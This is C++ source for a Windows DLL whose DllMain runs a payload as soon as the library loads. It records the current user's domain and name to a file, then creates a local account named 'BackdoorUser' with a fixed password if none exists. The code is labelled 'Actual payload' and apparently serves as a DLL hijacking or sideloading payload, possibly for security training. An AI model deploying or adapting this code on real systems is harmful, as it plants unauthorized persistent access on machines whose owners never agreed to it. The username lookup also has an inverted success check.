#include <windows.h>
#include <sddl.h>
#include <lm.h>

#include <iostream>
#include <fstream>
#include <sstream>

#pragma comment(lib, "Netapi32.lib")

using namespace std;

void writeInfo(std::string &info)
{
    std::ofstream myInfoStream("C:\\CCD\\Info.txt");

    if (!myInfoStream.fail())
    {
        myInfoStream << "This is the info: " << info << "\n";;
    }
}

int getUserDomainString(string &userAndDomain)
{
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) 
    {
        return 1;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) 
    {
        CloseHandle(hToken);
        free(pTokenUser);
        return 1;
    }

    LPWSTR userSid = nullptr;
    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &userSid)) 
    {
        CloseHandle(hToken);
        free(pTokenUser);
        return 1;
    }

    CHAR name[256], domain[256];
    DWORD nameLen = 256, domainLen = 256;
    SID_NAME_USE sidType;

    int ret = LookupAccountSidA(nullptr, pTokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType);

    if (ret == 0) // OK, extract <domain>\\username
    {
        std::stringstream sstrm;
        sstrm << domain << "\\" << name << std::endl;
        userAndDomain = sstrm.str();
    }   

    // cleanup
    LocalFree(userSid);
    CloseHandle(hToken);
    free(pTokenUser);
    return ret;
}

bool userExists(LPWSTR username)
{
    LPUSER_INFO_0 pUserInfo = nullptr;
    NET_API_STATUS status = NetUserGetInfo(nullptr, username, 0, (LPBYTE*)&pUserInfo);
    NetApiBufferFree(pUserInfo);
    return (status == NERR_Success);
}

void createUser(LPWSTR pUserName, LPWSTR passwd)
{
    // Set up user info
    USER_INFO_1 ui;
    ui.usri1_name = pUserName;
    ui.usri1_password = passwd;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = nullptr;
    ui.usri1_comment = nullptr;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = nullptr;
    DWORD dwError = 0;
    NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);
}


BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (DLL_PROCESS_ATTACH == ul_reason_for_call)
    {
        // Only for debugging; can be removed
        std::string userAndDomain = "";
        getUserDomainString(userAndDomain);
        writeInfo(userAndDomain);
        
        // Actual payload: Add user unless it exists already
        if (!userExists(L"BackdoorUser"))
        {
            createUser(L"BackdoorUser", L"BackdoorPasswd");
        }        
    }

    return TRUE;
}